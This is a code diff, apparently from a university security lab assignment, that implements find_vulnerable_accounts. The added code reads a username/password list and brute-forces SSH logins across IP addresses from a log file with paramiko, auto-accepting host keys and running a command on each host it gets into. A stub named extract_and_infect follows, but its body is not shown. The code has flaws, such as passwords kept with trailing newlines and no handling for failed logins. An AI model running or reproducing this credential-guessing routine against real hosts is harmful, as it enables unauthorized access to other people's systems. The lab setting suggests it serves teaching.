@@ -25,9 +25,20 @@ def find_vulnerable_accounts(ssh_log, telnet_log):
     Creates files ssh_accounts.log, telnet_accounts.log;
     Store user data in format ip,user,passwd.
     '''
-    
-    subprocess.run([])
-    pass
+    client = paramiko.client.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    with open("/home/cse/Lab2/Q2pwd") as file:
+        user_combos = file.readlines()
+    user_combos = [u.split(" ") for u in user_combos]
+
+    with open("open_ssh.log") as file:
+        ssh_log = file.readlines()
+    for ip in ssh_log:
+        for user, password in user_combos:
+            client.connect(ip, username=user, password=password)
+            _stdin, _stdout,_stderr = client.exec_command("df")
+            print(_stdout.read().decode())
+            client.close()
 
 def extract_and_infect():
     '''
